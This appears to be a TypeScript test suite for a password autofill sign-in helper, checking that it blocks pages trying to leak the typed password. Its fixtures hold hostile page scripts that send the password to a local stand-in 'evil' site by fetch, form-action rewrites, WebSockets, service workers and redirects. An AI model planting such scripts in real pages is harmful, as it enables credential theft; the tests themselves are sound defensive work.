import { createHash } from "node:crypto";
import { once } from "node:events";
import type { IncomingMessage, ServerResponse } from "node:http";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import type { Duplex } from "node:stream";

import type { Page as WorkerPage } from "@cloudflare/playwright";
import type { Browser, BrowserContext, Page } from "playwright";
import { chromium } from "playwright";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { signIn } from "./login";

const SAVED_SECRET = "s3cret-pw";

interface Hit {
    body: string;
    method: string;
    url: string;
}

type Handler = (request: IncomingMessage, response: ServerResponse, body: string) => void;

/** A local site on its own host, so two of them are two origins. Records every request with its body, and every WebSocket it accepts and each frame sent on one. */
const site = async (host: string, handler: Handler) => {
    const hits: Hit[] = [];
    const server = createServer((request, response) => {
        let body = "";

        request.on("data", (chunk: Buffer) => {
            body += chunk.toString();
        });
        request.on("end", () => {
            hits.push({ body, method: request.method ?? "", url: request.url ?? "" });
            handler(request, response, body);
        });
    });

    server.on("upgrade", (request: IncomingMessage, socket: Duplex) => {
        hits.push({ body: "", method: "WEBSOCKET", url: request.url ?? "" });
        // The low four bits of a frame's first byte: 1 is text, 8 is a close.
        socket.on("data", (frame: Buffer) => {
            hits.push({ body: "", method: `FRAME ${(frame[0] ?? 0) & 0x0f}`, url: request.url ?? "" });
        });
        socket.write(
            // eslint-disable-next-line sonarjs/hashing -- the WebSocket handshake is defined with SHA-1
            `HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${createHash("sha1")
                .update(`${request.headers["sec-websocket-key"] ?? ""}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
                .digest("base64")}\r\n\r\n`,
        );
    });
    server.listen(0, host);
    await once(server, "listening");

    return { close: () => server.close(), hits, origin: `http://${host}:${(server.address() as AddressInfo).port}` };
};

const html = (response: ServerResponse, markup: string): void => {
    response.setHeader("content-type", "text/html");
    response.end(`<!doctype html><title>Sign in</title>${markup}`);
};

/** The two fields of every login page here: a username and a password. */
const FIELDS = `<input name="user"><input name="pw" type="password">`;

const loginForm = (script = "", attributes = 'method="post" action="/session"'): string =>
    `<form ${attributes}>${FIELDS}<button>Go</button></form><script>${script}</script>`;

describe(signIn, () => {
    let browser: Browser;
    let context: BrowserContext;
    let page: Page;
    let evil: Awaited<ReturnType<typeof site>>;
    let login: Awaited<ReturnType<typeof site>>;
    /** What the login site serves at `/` and answers at `/session`; each case sets them. */
    const fixture: { home: string; onSession: Handler; page: string; worker: string } = { home: "", onSession: () => undefined, page: "", worker: "" };

    beforeAll(async () => {
        browser = await chromium.launch();
        evil = await site("127.0.0.2", (_request, response) => response.end("ok"));
        login = await site("127.0.0.1", (request, response, body) => {
            if (request.url === "/session") {
                fixture.onSession(request, response, body);
            } else if (request.url?.startsWith("/home")) {
                html(response, fixture.home);
            } else if (request.url === "/worker.js") {
                response.setHeader("content-type", "text/javascript");
                response.end(fixture.worker);
            } else {
                html(response, fixture.page);
            }
        });
    });

    afterAll(async () => {
        await browser.close();
        evil.close();
        login.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
        evil.hits.length = 0;
        login.hits.length = 0;
        fixture.home = "<h1>Home</h1>";
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/home" });
            response.end();
        };
    });

    afterEach(async () => {
        await context.close();
    });

    const run = async (now: () => number = Date.now) =>
        signIn(
            // The Worker's fork of the same API; its types differ only in a few narrower overloads.
            page as unknown as WorkerPage,
            {
                deadline: Date.now() + 30_000,
                navTimeout: 10_000,
                now,
                origin: login.origin,
                pageTimeout: 5000,
                password: SAVED_SECRET,
                url: `${login.origin}/`,
                username: "ann",
            },
        );

    const passwordLeft = async (): Promise<boolean> =>
        page.evaluate((secret) => [...document.querySelectorAll("input")].some((input) => input.value === secret), SAVED_SECRET);

    const sessionPosts = (): Hit[] => login.hits.filter((hit) => hit.url === "/session");

    it("sends the form by POST to the login's origin and reports where it landed", async () => {
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it.each([
        ["as the password is typed", `document.forms[0].pw.addEventListener("input", () => { document.forms[0].action = "EVIL/steal"; });`],
        ["in its submit handler", `document.forms[0].addEventListener("submit", () => { document.forms[0].action = "EVIL/steal"; });`],
    ])("does not send a form whose action a script moves to another site %s", async (_when, script) => {
        fixture.page = loginForm(script.replace("EVIL", () => evil.origin));

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("blocks a submit handler that posts the password to another site, and clears the field", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("${evil.origin}/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("keeps blocking after a decoy request and a same-document navigation", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/beacon", { body: "event=submit", method: "POST" }); history.pushState({}, "", "/next"); fetch("EVIL/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`.replace(
                "EVIL",
                () => evil.origin,
            ),
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("does not count a same-origin request without the password as the form being sent", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("/beacon", { body: "event=submit", method: "POST" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
    });

    it("signs in through a script that posts the login as JSON", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" }); });`,
        );
        fixture.onSession = (_request, response) => response.end("{}");

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: JSON.stringify({ pw: SAVED_SECRET, user: "ann" }), method: "POST", url: "/session" }]);
    });

    it("waits for a slow server's answer before it reports where the form landed", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            setTimeout(() => {
                response.writeHead(303, { location: "/home" });
                response.end();
            }, 2500);
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it("types nothing into a form that would post from another window", async () => {
        fixture.page = loginForm("", 'method="post" action="/session" target="_blank"');

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
        expect(await page.inputValue("[name=user]")).toBe("");
    });

    it("signs in when the page it lands on embeds another site", async () => {
        fixture.page = loginForm();
        fixture.home = `<h1>Home</h1><iframe src="${evil.origin}/widget"></iframe>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(evil.hits.filter((hit) => hit.body !== "")).toStrictEqual([]);
    });

    it("reports a login page shown again as a password field that remains", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ passwordFieldRemains: true, submitted: true, success: true });
    });

    it("types nothing into a form that a base element sends to another window", async () => {
        fixture.page = `<base target="_blank">${loginForm()}`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
        expect(await page.inputValue("[name=user]")).toBe("");
    });

    it("blocks a form a submit handler sends to another window", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", () => { document.forms[0].target = "_blank"; });`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it.each([
        [307, "to another site", () => `${evil.origin}/steal`],
        [308, "to another site", () => `${evil.origin}/steal`],
        // The browser takes this address; a strict URL parser does not.
        // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
        [307, "whose address does not parse", () => "http://a b/"],
    ])("fails a %i redirect %s, and reports the form as sent", async (status, _where, location) => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(status, { location: location() });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("redirect"), submitted: true, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("clears the password when the page throws after it was typed", async () => {
        fixture.page = loginForm(`HTMLFormElement.prototype.requestSubmit = () => { throw new Error("broken"); };`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(result).not.toHaveProperty("sessionClosed");
        expect(await passwordLeft()).toBe(false);
    });

    it("tells the caller to close the session when the password cannot be cleared", async () => {
        // The page keeps what was typed and puts it back on every load.
        fixture.page = loginForm(
            `const field = document.forms[0].pw; field.value = localStorage.getItem("p") ?? ""; field.addEventListener("input", () => { if (field.value) localStorage.setItem("p", field.value); }); document.forms[0].addEventListener("submit", (event) => event.preventDefault());`,
        );

        const result = await run();

        expect(result).toStrictEqual({ error: expect.stringContaining("session was closed"), sessionClosed: true, submitted: false, success: false });
    });

    it("reports a form the page held back as not sent", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => event.preventDefault());`);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
        expect(await passwordLeft()).toBe(false);
    });

    it("types nothing into a password field outside a form", async () => {
        fixture.page = FIELDS;

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(await page.inputValue("[name=user]")).toBe("");
    });

    it("reports a sign-in whose answer fails to load as sent, not signed in", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            // A redirect the browser itself refuses to follow.
            // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
            response.writeHead(307, { location: "http://[" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not load"), submitted: true, success: false });
    });

    it("closes the page and the session when the hold ends after the password was typed", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm(`document.forms[0].pw.addEventListener("input", () => window.endHold());`);

        const result = await run(() => Date.now() + offset);

        expect(result).toMatchObject({ sessionClosed: true, submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
        expect(page.isClosed()).toBe(true);
    });

    it("closes the page rather than clear it past the hold when the sign-in lands at its end", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm();
        fixture.home = `<h1>Home</h1><script>window.endHold();</script>`;

        const result = await run(() => Date.now() + offset);

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it("scrubs the password from the URL and title it reads back", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: `/home?echo=${encodeURIComponent(SAVED_SECRET).toLowerCase()}` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ success: true, url: `${login.origin}/home?echo=[password]` });
    });

    it.each([
        ["switches the form to GET", `document.forms[0].addEventListener("submit", () => { document.forms[0].method = "get"; });`],
        [
            "navigates with it in the address",
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); location.href = "/next?pw=" + encodeURIComponent(document.forms[0].pw.value); });`,
        ],
    ])("blocks a same-origin request that carries the password in its address when a submit handler %s", async (_what, script) => {
        fixture.page = loginForm(script);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in an address"), submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.url.includes(SAVED_SECRET))).toStrictEqual([]);
    });

    it("closes the session when the reloaded page shows the password as text", async () => {
        let echoed = "";

        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            echoed = new URLSearchParams(body).get("pw") ?? "";
            response.writeHead(303, { location: "/home" });
            response.end();
        };
        // The site renders what it was sent, as a page could from its own records.
        Object.defineProperty(fixture, "home", { configurable: true, get: () => `<p>Signed in with ${echoed}</p>` });

        const result = await run();

        Reflect.deleteProperty(fixture, "home");

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it.each([
        ["a beacon of the whole form", `navigator.sendBeacon("/beacon", new FormData(document.forms[0]));`],
        ["a fetch with the password alone", `fetch("/check", { body: document.forms[0].pw.value, method: "POST" });`],
    ])("does not count %s as the sign-in", async (_what, send) => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); ${send} });`);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
    });

    it("refuses a WebSocket to another site while the password is in the page", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + document.forms[0].pw.value); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("WebSocket"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("closes a WebSocket to another site the page opened before the password was typed", async () => {
        fixture.page = loginForm(
            `const socket = new WebSocket("${evil.origin.replace("http", "ws")}/live"); document.forms[0].addEventListener("submit", () => { try { socket.send(document.forms[0].pw.value); } catch {} });`,
        );
        // The page is only filled once its socket is open.
        fixture.page += `<script>document.forms[0].pw.type = "text"; new Promise((resolve) => setTimeout(resolve, 300)).then(() => { document.forms[0].pw.type = "password"; });</script>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(evil.hits.map((hit) => hit.method).filter((method) => method !== "FRAME 8")).toStrictEqual(["WEBSOCKET"]);
    });

    it("sees the form's POST past a service worker that would answer it itself", async () => {
        fixture.page = loginForm();
        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("fetch", (event) => { if (event.request.method === "POST") event.respondWith(new Response("held")); });`;
        await page.goto(`${login.origin}/`);
        await page.evaluate(async () => {
            await navigator.serviceWorker.register("/worker.js");
            await navigator.serviceWorker.ready;
        });

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it("blocks a service worker that the page hands the password to", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); navigator.serviceWorker.controller.postMessage(document.forms[0].pw.value); });`,
        );
        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("message", (event) => { fetch("${evil.origin}/steal", { body: event.data, method: "POST", mode: "no-cors" }); });`;
        await page.goto(`${login.origin}/`);
        await page.evaluate(async () => {
            await navigator.serviceWorker.register("/worker.js");
            await navigator.serviceWorker.ready;
        });

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("counts the form's own POST as sent when the page re-encodes the password first", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => { const field = document.forms[0].pw; field.value = [...field.value].reverse().join(""); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toHaveLength(1);
    });

    it("stops waiting on a submit handler that does not return", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const end = Date.now() + 7000; while (Date.now() < end) {} });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not finish"), submitted: false, success: false });
    });
});
